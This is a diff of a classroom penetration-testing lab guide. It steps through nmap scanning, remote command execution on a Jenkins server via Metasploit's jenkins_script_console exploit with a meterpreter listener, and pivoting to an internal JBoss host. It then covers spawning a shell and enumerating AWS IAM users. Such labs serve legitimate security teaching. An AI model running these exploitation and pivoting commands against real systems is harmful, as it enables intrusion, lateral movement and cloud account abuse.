@@ -2,25 +2,41 @@
 
 **Table of Contents**
 
-- []()
-- []()
-- []()
-- []()
+- [Enumeration](##enumeration)
+- [Exploiting Jenkins Manually](##exploiting-jenkins-manually)
+- [Introducing Metasploit](##introducing-metasploit)
+- [Exploiting Jenkins with Metasploit](##exploiting-jenkins-with-metasploit)
+- [Pivot/Penetrate](##pivot/penetrate)
 
 # Title
 
-In this lab, we will be exploiting a popular Build Platform.
+In this lab, we will be exploiting a popular Build Platform and use it to pivot deeper into the network.
 
 *Resources:*
 
-- []()
-- []()
-- []()
-- []()
+- [https://nmap.org/book/man.html](https://nmap.org/book/man.html)
+- [https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)
+- [http://docs.aws.amazon.com/cli/latest/](http://docs.aws.amazon.com/cli/latest/)
 
 ---
 
-## Exploit Jenking Manually
+## Enumeration
+
+Find a vulnerable host.
+
+1. Install Nmap.
+
+  ```
+$ sudo yum -y install nmap
+  ```
+
+2. Port scan a vulnerable host.
+
+  ```
+$ nmap -PN -p8080 -sV 52.41.95.90
+  ```
+
+## Exploiting Jenkins Manually
 
 1. Load `http://52.39.125.179:8080` on your browser.
 
@@ -32,27 +48,29 @@ In this lab, we will be exploiting a popular Build Platform.
 
 5. Go back to your project and click `Configure` run other commands such as `whoami`, `pwd` and `ps` to familiarize yourself with this host. What flavor of linux is this? What packages are installed?
 
-## Metasploit
+
+## Introducing Metasploit
 
 1. Install Metasploit.
 
-Download and extract the Metasploit package from the DSO bucket: `dso-public-bucket`
+  Download and extract the Metasploit package from the DSO bucket: `dso-public-bucket`
 
-```
+  ```
 $ curl -O https://s3-us-west-2.amazonaws.com/dso-public-bucket/metasploit-framework-master.zip
 $ unzip metasploit-framework-master.zip
-```
+  ```
 
-Alternatively clone the Metasploit Git project directly.
+  Alternatively clone the Metasploit Git project directly.
 
-```
+  ```
 $ git clone https://github.com/rapid7/metasploit-framework.git
-```
+  ```
 
-2. Run `msfconsole`.
+2. Install dependencies and run `msfconsole`.
 
-```
+  ```
 $ cd metasploit-framework-master
+$ sudo yum -y install libpcap-devel postgresql-devel libsqlite3-dev sqlite-devel
 $ bundle install
 $ ./msfconsole
 
@@ -72,20 +90,20 @@ $ ./msfconsole
 + -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
 
 msf >
-```
+  ```
 
-3. Search for the Jenkins-CI Script-Console Java Execution exploit. You can do this using the `search` keyword.
+## Exploiting Jenkins with Metasploit
 
-## Exploit Jenkins
+1. Search for the Jenkins-CI Script-Console Java Execution exploit. You can do this using the `search` keyword.
 
-1. Configure the exploit for use.
+2. Configure the exploit for use.
 
-In the example below we are using TCP port 10001 to create a listener. Please contact the instructor to see which port you should be using.
+In the example below we are using TCP port 10001 to create a listener (`LPORT`). Please contact the instructor to see which port you should be using.
 
 ```
 > use exploit/multi/http/jenkins_script_console
 > show options
-  > set RHOST 52.39.125.179
+> set RHOST 52.39.125.179
 > set RPORT 8080
 > set TARGETURI /
 > set target 1
@@ -128,7 +146,8 @@ Throw the shell into the background by pressing `ctrl-z`, followed by `y` and `E
 > sessions
 ```
 
-Make note of the session ID, e.g., `2`.
+Make note of the session ID, e.g., `1`.
+
 
 ## Pivot/Penetrate
 
@@ -137,17 +156,41 @@ Make note of the session ID, e.g., `2`.
 E.g.,
 
 ```
-> route add 10.0.6.0 255.255.255.0 2
+> route add 10.0.6.0 255.255.255.0 1
 ```
 
-2. Search for the JBoss DeploymentFileRepository WAR Deployment exploit. You can do this using the `search` keyword.
+2. Scan the host you discovered for vulnerabilities.
 
-Configure the exploit.
+```
+> use auxiliary/scanner/http/jboss_vulnscan
+> show options
+> set RHOSTS 10.0.6.165
+> set RPORT 8080
+> show options
+> run
+```
+
+2. Search for the JBoss DeploymentFileRepository WAR Deployment exploit. E.g., `search JMXInvokerServlet`.
+
+3. Configure the exploit.
 
 ```
 > use exploit/multi/http/jboss_invoke_deploy
 > set RHOST 10.0.6.165
 > set target 1
-> set payload java/meterpreter/reverse_tcp
-> set LPORT 10002
+> set payload java/meterpreter/bind_tcp
+> set LPORT 10001
+> exploit
 ```
+
+4. Run the AWS CLI to determine if this host has IAM permissions.
+
+```
+> shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+$ export http_proxy=http://proxy:3128
+$ export https_proxy=http://proxy:3128
+$ aws iam list-users --region us-west-2
+```
+
+What does this mean?
